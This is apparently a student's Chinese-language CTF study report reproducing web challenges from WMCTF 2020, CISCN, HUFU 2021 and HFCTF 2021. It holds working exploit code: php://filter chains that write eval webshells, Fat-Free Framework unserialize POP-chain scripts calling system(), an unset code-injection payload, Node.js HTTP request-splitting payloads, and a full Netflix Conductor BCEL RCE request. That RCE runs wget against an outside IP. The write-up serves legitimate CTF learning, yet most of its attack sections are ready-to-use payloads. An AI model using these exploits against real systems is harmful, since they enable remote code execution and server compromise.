# Nepnep学习报告 web第四周

- WMCTF 2020 部分题目复现
- Insomni hack teaser 2019 部分题目复现
- disable_functions 绕过
- php 过滤器巧用

## [WMCTF 2020] web check in 1.0/2.0

源码

```php
<?php 
//PHP 7.0.33 Apache/2.4.25 
error_reporting(0); 
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']); 
@mkdir($sandbox); 
@chdir($sandbox); 
highlight_file(__FILE__); 
if(isset($_GET['content'])) { 
    $content = $_GET['content']; 
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content)) 
         die('hacker'); 
    if(file_exists($content)) 
        require_once($content); 
    echo $content; 
    file_put_contents($content,'<?php exit();'.$content); 
} 
```

简明来说就是死亡 exit 绕过, 但是几乎所有的过滤器都禁用了, 官方还把 %25 ban了, 可以先看一下伪协议如何处理 url 编码这一类 payload

```php
static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* {{{ */
{
	char *p, *token = NULL;
	php_stream_filter *temp_filter;

	p = php_strtok_r(filterlist, "|", &token);
	while (p) {
		php_url_decode(p, strlen(p)); # 对过滤器进行了一次urldecode
		if (read_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->readfilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		if (write_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->writefilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		p = php_strtok_r(NULL, "|", &token);
	}
}
```

进入的时候 html 网页本身会解码一次, 然后写入文件时伪协议会对 url 编码的 payload 处理一次 payload, %25 被ban后就尝试寻找其它的二次编码突破口

```php
<?php
//$char = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$(){}[]"\'|\\/-+=*&^`~.';  # 构造全部的二次编码
for ($i = 0; $i < strlen($char); $i++) {
    for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
        for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
            $aaa = '%' . $ascii1 . '%' . $ascii2;
            if (urldecode(urldecode($aaa)) == $char[$i]) {
                echo $char[$i] . ': ' . $aaa;
                echo "\n";
            }
        }
    }
}
?>
```

可以得到一些比较常用的特别的二次编码

```
a: %6%31
b: %6%32
i: %6%39
q: %7%31
r: %7%32
u: %7%35
U: %5%35
```

测试了一下base64过滤器, 效果很差, 于是采用了 rot 和 iconv, 原题说是需要爆破临时文件才能得到解, 临时文件的命名规则如下: 

- 默认为 php+4或者6位随机数字和大小写字母

- php[0-9A-Za-z]{3,4,5,6}

然后就是通过爆破临时文件然后 require_once 包含木马, 研究过滤器后发现并不需要这么做

### 非预期

payload

```
# iconv 2次转换摧毁死亡函数 exit
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pe@av(l_$OPTSh[ca]k;)>?/resource=ricky.php
# iconv+rot13 2次转换后解码摧毁死亡函数 exit
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<uc cr@ni(y_$BCGFu[pn]x;)>?|string.%7%32ot13|/resource=ricky.php
```

这两种方法即可直接破坏本身存在的 `<?php` 开头的任何文件, 分别会得到这样的文件内容

```
# iconv 2次转换摧毁死亡函数 exit
?<hp pxeti)(p;ph/:f/liet/rrwti=eocvnre.t6%c9no.v5%C5-SL2.E5%C5-SB2|E<?php @eval($_POST[hack]);?>r/seuocr=eirkc1yp.ph
# iconv+rot13 2此转换后解码摧毁死亡函数 exit
?<uc ckrgv)(c;cu/:s/yvrg/eejgv=rbpiaer.g6%p9ab.i5%P5-FY2.R5%P5-FO2|R<?php @eval($_POST[hack]);?>f|egav.t7%b21g|3e/frhbpe=rvexp.luc
```

这样直接访问沙盒里生成的文件就等同于获得了一个 shell, 然后就是访问根目录的 flag 文件 get shell

![20210419140652234](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419140652234.png)

WP中介绍了**字符串过滤器中的部分 **, **压缩过滤器**和**加密过滤器**, 再研究一下这三个冷门的过滤器

| 过滤器             | 作用                               |
| ------------------ | ---------------------------------- |
| zlib.deflate       | 压缩                               |
| zlib.inflate       | 解压                               |
| mcrypt.tripledes   | 加密                               |
| mdecrypt.tripledes | 解密                               |
| string.toupper     | 大写                               |
| string.tolower     | 小写                               |
| string.strip_tags  | 发生segment fault, 生成php临时文件 |

结合`zlib.deflate`和`zlib.inflate`使用后会发现**中间插入string.tolower转后会把空格和exit给处理了**

```
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_POST[hack]);?>/resource=ricky.php
```

官方的解法感觉特麻烦而且直接生成的 shell 根本不能在 file_put_contents 后直接使用, 爆破临时文件这个考点显得很鸡肋

## [WMCTF2020] webcheckin

/www.zip 查看源码

一个FatFramework的反序列化

```php
<?php

// Kickstart the framework
$f3=require('lib/base.php');

$f3->set('DEBUG',1);
if ((float)PCRE_VERSION<8.0)
	trigger_error('PCRE version is out of date');

// Load configuration
$f3->config('config.ini');

$f3->route('GET /',
	function($f3) {
		echo "just get me a,don't do anything else";
	}
);
unserialize($_GET['a']);

$f3->run();
```

需要反序列化首先就是全局搜索 __destruct(), 唯一可用的在 ws.php 里面的对象 Agent

```php
    function __destruct() {
        if (isset($this->server->events['disconnect']) &&
            is_callable($func=$this->server->events['disconnect']))
            $func($this);  # class Agent
    }
```

然后发现最终需要访问 Agent 类内的一个函数, 可以利用触发 __call 的只有函数 fetch

```php
    function fetch() {
        // Unmask payload
        $server=$this->server;
        if (is_bool($buf=$server->read($this->socket)))
            return FALSE;
```

`$this->server` 可控, 访问不存在的函数 read 触发 `__call`, 测试了一下, 对象 Base 是 final 类无法触发然后另外几个发现触发 `__call` 之后直接访问 `call_user_func_array`, 然后需要的是访问类和函数, `$func` 这个我们无法改动指定是 `read` 所以执行就会报错, 只有 DB/sql/mapper.php 里面不是直接传入 `$func` 并且 `$this->props[]` 可控

```php
	function __call($func,$args) {
		return call_user_func_array(
			(array_key_exists($func,$this->props)?
				$this->props[$func]:
				$this->$func),$args
		);
	}
```

然后测试发现直接使用 `CLI\Agent` 不行, 在 autoload 时会有文件包含错误, 导致反序列化时找不到类的定义, 先从 `CLI\WS` 入手, 让其包含正确的 `CLI\Agent` 定义文件(也就是需要在对象 Agent 上套一层 `CLI\WS` 的壳)

建立 exp.php 如下

```php
<?php
namespace DB\SQL {
    class Mapper {
        protected $props=[];
        function __construct($prop) {
            $this->props=$prop;
        }
    }
}

namespace CLI {
    class Agent
    {
        protected $server;
        protected $socket;

        public function __construct($server, $socket) {
            $this->server = $server;
            $this->socket = $socket;
        }
    }
    class WS {
        protected $events=[];
        public function __construct($events) {
            $this->events = $events;
        }
    }
}

namespace {
    class Basket {
        public $events = [];
        public function __construct($events) {
            $this->events = $events;
        }
    }
}

namespace {

    use CLI\Agent;
    use CLI\WS;
    use DB\SQL\Mapper;

    $a = new Mapper(array("read"=>"system"));
//    $b = new Agent($a, 'find / | grep flag');
    $b = new Agent($a, 'cat /etc/flagzaizheli');
    $c = new Basket(array("disconnect"=>array($b,"fetch")));
    $d = new Agent($c, '');
    $e = new WS($d);
    echo urlencode(serialize($e));
}
```

**补充**

 `CISCN2020 baby unserialize` 考察的也是 Fat Framework 的反序列化

源码

```php
<?php

// Kickstart the framework
$f3=require('lib/base.php');

if ((float)PCRE_VERSION<8.0)
    trigger_error('PCRE version is out of date');

$f3->route('GET /',
    function($f3) {
        echo "may be you need /?flag=";
    }
);

unserialize($_GET['flag']);

$f3->run();
```

全局搜索 `__destruct()`,  在jig.php中发现了write方法

```php
function __destruct() {
	if ($this->lazy) {
		$this->lazy = FALSE;
		foreach ($this->data?:[] as $file => $data)
			$this->write($file,$data);
	}
}
```

`$this->lazy` 可控, 跟进 write 函数

```php
function write($file,array $data=NULL) {
	if (!$this->dir || $this->lazy)
		return count($this->data[$file]=$data);
	$fw=\Base::instance();
	switch ($this->format) {
		case self::FORMAT_JSON:
			$out=json_encode($data,JSON_PRETTY_PRINT);
			break;
		case self::FORMAT_Serialized:
			$out=$fw->serialize($data);
			break;
	}
	return $fw->write($this->dir.$file,$out);
}
```

传入的值 `$data` 是一个数组, 然后就会进入到 base.php 中的write函数 

```php
function write($file,$data,$append=FALSE) {
		return file_put_contents($file,$data,$this->hive['LOCK']|($append?FILE_APPEND:0));
	}
```

把 `$data` 写入 `$file` 中, 很明显 `$this->dir` 和 `$data` 我们都可控, 就可以直接把🐎写入我们需要存放的位置, 建立 exp.php

```php
<?php
namespace DB;
class Jig {
    const
        FORMAT_JSON=0,
        FORMAT_Serialized=1;

    protected
        //! Storage location
        $dir = './',
        //! Current storage format
        $format = self::FORMAT_JSON,
        //! Jig log
        $data = array("ricky.php"=>array("a"=>"<?php eval(\$_POST[ricky]);?>")),
        //! lazy load/save files
        $lazy = TRUE;
}
$a = new Jig();
echo urlencode(serialize($a));
```

访问木🐎攻击即可

## [HUFU2021] unset

这个也是考察了 Fat Framework 的 unset 逃逸任意命令执行的漏洞, 源码

```php
<?php
// Kickstart the framework
$f3=require('lib/base.php');
$f3->set('DEBUG',1);
if ((float)PCRE_VERSION<8.0)
    trigger_error('PCRE version is out of date');
// Load configuration
highlight_file(__FILE__);
$a=$_GET['a'];
unset($f3->$a);
$f3->run(); 
```

直接拿 github 上的 Fat Framework 源码发现会报错, 出错在 base.php 的 eval 处, 然后审计一下上面的正则表达式

```php
$val=preg_replace('/^(\$hive)/','$this->hive',
   $this->compile('@hive.'.$key, FALSE));     
eval('unset('.$val.');');
```

因为该 正则表达式 是单行匹配 `/^(\$hive)/`, 所以加了换行符以后下面的语句作为单独的一条 php 语句进行处理, 不会进入 `'@hive'.$key` 的拼接

![20210419214824484](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419214824484.png)

少了换行符时

![20210419214839882](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419214839882.png)

payload

```
?a='ricky'%0a);phpinfo();//
?a='ricky'%0a);system('cat /flag');//
```

## [虎符CTF 2021]Internal System

### 简述

```
开发了一个公司内部的请求代理网站，好像有点问题，但来不及了还是先上线吧（─.─||）
http://8.140.152.226:47921/
hint: /source存在源码泄露；/proxy存在ssrf
```

### 步骤

登陆端口

```js
router.get('/login', (req, res, next) => {
  const {username, password} = req.query;

  if(!username || !password || username === password || username.length === password.length || username === 'admin') {
    res.render('login')
  } else {
    const hash = sha256(sha256(salt + username) + sha256(salt + password))

    req.session.admin = hash === adminHash

    res.redirect('/index')
  }
})
```

数组绕过, 用户名以数组方式传入, 当其与密码字符串再次相加时会再次变成字符串从而绕过sha1检测和字符串全等于

登录之后，赵总这里给出了网络接口相关的参数，比赛环境里倒没有，需要猜, Url口会调用 /proxy, 尝试ssrf

```js
function SSRF_WAF(url) {
  const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')

  return isIp(host) && IP.isPublic(host)
}

function FLAG_WAF(url) {
  const pathname = new UrlParse(url).pathname
  return !pathname.startsWith('/flag')
}

function OTHER_WAF(url) {
  return true;
}

const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]
```

这几个 WAF 需要输入的 URL Host 为公网 IP，且目录不以 `/flag` 开头。

这个 NodeJS 服务默认是开在 3000 端口，但是如果直接访问 `http://127.0.0.1:3000/` 会被 WAF 给拦住, 考虑用 0.0.0.0

```
/proxy?url=http://0.0.0.0:3000/
```

发现有回显, 去看 /search 口, 通过 search 带出 /flag 路由从而绕过 WAF

```js
router.all('/search', async (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
  }

  const result = {title: 'Search Success', content: ''}

  const method = req.method.toLowerCase()
  const url = decodeURI(req.query.url)
  const data = req.body

  try {
    if(method == 'get') {
      const response = await axios.get(url)
      result.content = formatResopnse(response.data)
    } else if(method == 'post') {
      const response = await axios.post(url, data)
      result.content = formatResopnse(response.data)
    } else {
      result.title = 'Error'
      result.content = 'Unsupported Method'
    }
  } catch(error) {
    result.title = 'Error'
    result.content = error.message
  }

  return res.json(result)
})router.all('/search', async (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
  }

  const result = {title: 'Search Success', content: ''}

  const method = req.method.toLowerCase()
  const url = decodeURI(req.query.url)
  const data = req.body

  try {
    if(method == 'get') {
      const response = await axios.get(url)
      result.content = formatResopnse(response.data)
    } else if(method == 'post') {
      const response = await axios.post(url, data)
      result.content = formatResopnse(response.data)
    } else {
      result.title = 'Error'
      result.content = 'Unsupported Method'
    }
  } catch(error) {
    result.title = 'Error'
    result.content = error.message
  }

  return res.json(result)
})
```

通过get传参url获取参数, 而且不让 127.0.0.1 访问, 还是用 0.0.0.0 去请求 /flag 路由

```
/proxy?url=http://0.0.0.0:3000/search?url=http://0.0.0.0:3000/flag
```

提示在内网中有一个 netflix conductor server 

```
someone else also deploy a netflix conductor server in Intranet?
```

> https://github.com/Netflix/conductor
>
> https://netflix.github.io/conductor/
>
> Conductor is an *orchestration* engine that runs in the cloud.

它默认是开在 8080 端口，于是在内网中扫一扫

```
/proxy?url=http://0.0.0.0:3000/search?url=http://10.128.0.*:8080/
/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.140.*:8080/
```

扫到返回大量信息的ip

```
/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.140.9:8080/
```

这是一个 Swagger UI，也就是个 API 接口文档

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Swagger UI</title>
  <link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32" />
  <link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16" />
  <link href='css/typography.css' media='screen' rel='stylesheet' type='text/css'/>
  <link href='css/reset.css' media='screen' rel='stylesheet' type='text/css'/>
  <link href='css/screen.css' media='screen' rel='stylesheet' type='text/css'/>
  <link href='css/reset.css' media='print' rel='stylesheet' type='text/css'/>
  <link href='css/print.css' media='print' rel='stylesheet' type='text/css'/>

  <script src='lib/object-assign-pollyfill.js' type='text/javascript'></script>
  <script src='lib/jquery-1.8.0.min.js' type='text/javascript'></script>
  <script src='lib/jquery.slideto.min.js' type='text/javascript'></script>
  <script src='lib/jquery.wiggle.min.js' type='text/javascript'></script>
  <script src='lib/jquery.ba-bbq.min.js' type='text/javascript'></script>
  <script src='lib/handlebars-4.0.5.js' type='text/javascript'></script>
  <script src='lib/lodash.min.js' type='text/javascript'></script>
  <script src='lib/backbone-min.js' type='text/javascript'></script>
  <script src='swagger-ui.js' type='text/javascript'></script>
  <script src='lib/highlight.9.1.0.pack.js' type='text/javascript'></script>
  <script src='lib/highlight.9.1.0.pack_extended.js' type='text/javascript'></script>
  <script src='lib/jsoneditor.min.js' type='text/javascript'></script>
  <script src='lib/marked.js' type='text/javascript'></script>
  <script src='lib/swagger-oauth.js' type='text/javascript'></script>

  <!-- Some basic translations -->
  <!-- <script src='lang/translator.js' type='text/javascript'></script> -->
  <!-- <script src='lang/ru.js' type='text/javascript'></script> -->
  <!-- <script src='lang/en.js' type='text/javascript'></script> -->

  <script type="text/javascript">
      $(function () {

          var url = window.location.search.match(/url=([^&]+)/); //http://127.0.0.1:8080/?url=127.0.0.1:8080
          if (url && url.length > 1) {
              url = decodeURIComponent(url[1]);

              if (!url.includes('://')) {
                  url = `http://${url}`;
              }
          } else {
              url = window.location.origin;
          }

          hljs.configure({
              highlightSizeThreshold: 5000
          });

          // Pre load translate...
          if(window.SwaggerTranslator) {
              window.SwaggerTranslator.translate();
          }
          window.swaggerUi = new SwaggerUi({
              url: url + "/api/swagger.json",
              dom_id: "swagger-ui-container",
              supportedSubmitMethods: ['get', 'post', 'put', 'delete', 'patch'],
              onComplete: function(swaggerApi, swaggerUi){
                  window.swaggerUi.api.setBasePath("/api");
                  if(typeof initOAuth == "function") {
                      initOAuth({
                          clientId: "your-client-id",
                          clientSecret: "your-client-secret-if-required",
                          realm: "your-realms",
                          appName: "your-app-name",
                          scopeSeparator: " ",
                          additionalQueryStringParams: {}
                      });
                  }

                  if(window.SwaggerTranslator) {
                      window.SwaggerTranslator.translate();
                  }
              },
              onFailure: function(data) {
                  log("Unable to Load SwaggerUI");
              },
              docExpansion: "none",
              jsonEditor: false,
              defaultModelRendering: 'schema',
              showRequestHeaders: false
          });

          window.swaggerUi.load();

          function log() {
              if ('console' in window) {
                  console.log.apply(console, arguments);
              }
          }
      });

  </script>
</head>

<body class="swagger-section">
<div id='header'>
  <div class="swagger-ui-wrap">
    <a id="logo" href="http://swagger.io"><img class="logo__img" alt="swagger" height="30" width="30" src="images/logo_small.png" /><span class="logo__title">swagger</span></a>
    <form id='api_selector'>
      <div class='input'><input placeholder="http://example.com/api" id="input_baseUrl" name="baseUrl" type="text"/></div>
      <div id='auth_container'></div>
      <div class='input'><a id="explore" class="header__btn" href="#" data-sw-translate>Explore</a></div>
    </form>
  </div>
</div>

<div id="message-bar" class="swagger-ui-wrap" data-sw-translate>&nbsp;</div>
<div id="swagger-ui-container" class="swagger-ui-wrap"></div>
</body>
</html>
```

根据 swagger.json 拿到接口列表

```
/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/swagger.json
```

先从配置下手

```
/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/admin/config
{ 
"jetty.git.hash": "b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b",
"loadSample": "true", 
"io.netty.noUnsafe": "true", 
"conductor.jetty.server.enabled": "true",
"io.netty.noKeySetOptimization": "true", 
"buildDate": "2021-04-03_17:38:09", "io.netty.recycler.maxCapacityPerThread": "0", 
"conductor.grpc.server.enabled": "false", 
"version": "2.26.0-SNAPSHOT", 
"queues.dynomite.nonQuorum.port": "22122", 
"workflow.elasticsearch.url": "es:9300", 
"workflow.namespace.queue.prefix": "conductor_queues", 
"user.timezone": "GMT", 
"workflow.dynomite.cluster.name": "dyno1", 
"sun.nio.ch.bugLevel": "", 
"workflow.dynomite.cluster.hosts": "dyno1:8102:us-east-1c",
"workflow.elasticsearch.instanceType": "external", 
"db": "dynomite", 
"queues.dynomite.threads": "10", 
"workflow.namespace.prefix": "conductor",
"workflow.elasticsearch.index.name": "conductor" 
}
```

版本为 `2.26.0-SNAPSHOT` 

### Netflix Conductor RCE

参考 [CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析](https://xz.aliyun.com/t/7889#toc-4)

> 这个漏洞出在 `/api/metadata/taskdefs` 上，需要 POST 一个 JSON 过去，里面含有恶意的 BCEL 编码，可以造成 RCE。 

什么是 BCEL编码

> [http://commons.apache.org/proper/commons-bcel/](https://commons.apache.org/proper/commons-bcel/)
>
> The Byte Code Engineering Library (Apache Commons BCEL™) is intended to give users a convenient way to analyze, create, and manipulate (binary) Java class files (those ending with .class). Classes are represented by objects which contain all the symbolic information of the given class: methods, fields and byte code instructions, in particular.
>
> Byte Code Engineering Library (BCEL)，这是Apache Software Foundation 的Jakarta 项目的一部分。BCEL是 Java classworking 最广泛使用的一种框架,它可以让您深入 JVM 汇编语言进行类操作的细节。

可以用 [BCELCodeman](https://github.com/f1tz/BCELCodeman) 这个工具来编码、解码。 

### NodeJS 8 HTTP 请求走私

暂且先不看这个，咱先看看 **怎么从 GET 接口打 POST 请求**。

NodeJS 有个 [CVE-2018-12116](https://www.cvedetails.com/cve/CVE-2018-12116/)，可以在 `path` 里构造带有 Unicode 的数据，发送非预期的路径给服务端来生成另一个 HTTP 请求。

或者可以说是 **HTTP 请求走私**（HTTP request smuggling）。

> Node.js: All versions prior to Node.js 6.15.0 and 8.14.0: HTTP request splitting: If Node.js can be convinced to use unsanitized user-provided Unicode data for the `path` option of an HTTP request, then data can be provided which will trigger a second, unexpected, and user-defined HTTP request to made to the same server.

[影响范围](https://hub.docker.com/_/node?tab=description&page=1&ordering=last_updated&name=8.13)

启用docker

```
docker pull node:8.13.0-alpine
docker run -itd --name node8.13-test node:8.13.0-alpine
docker exec -it node8.13-test /bin/sh
# 进入docker里执行
npm i axios
node
```

Node内执行

```
const axios = require('axios') 
var s = 'http://xxx.xxx.xxx.xxx:xxxx/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private' 
axios.get(s).then((r) => console.log(r.data)).catch(console.error)
```

夹带post请求也是

```
const axios = require('axios') 
var s = 'http://xxx.xxx.xxx.xxx:xxxx/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.66.14:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:15\u{010D}\u{010A}\u{010D}\u{010A}NodeTest\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'
axios.get(s).then((r) => console.log(r.data)).catch(console.error)
```

### 通过 SSRF 打Conductor RCE

参考文献: 

1. https://www.zhaoj.in/read-6905.html

2. https://miaotony.xyz/2021/04/05/CTF_2021HFCTF_internal_system/

了解后发现反弹shell不行就尝试通过 wget 或者 curl 外带数据

Evil.java

```java
public class Evil
{
    public Evil() {
        try {
            Runtime.getRuntime().exec("wget http://81.70.101.91:10001 -O /tmp/ricky");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(final String[] array) {
    }
}
```

编译

```
java -jar BCELCodeman.jar e Evil.java
$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A
```

组合

```
[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
```

构造

```
POST /api/metadata/taskdefs? HTTP/1.1 
Host: 10.0.64.14:8080 
Content-Type: application/json 
Content-Length:1408 

[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
```

URL编码

```
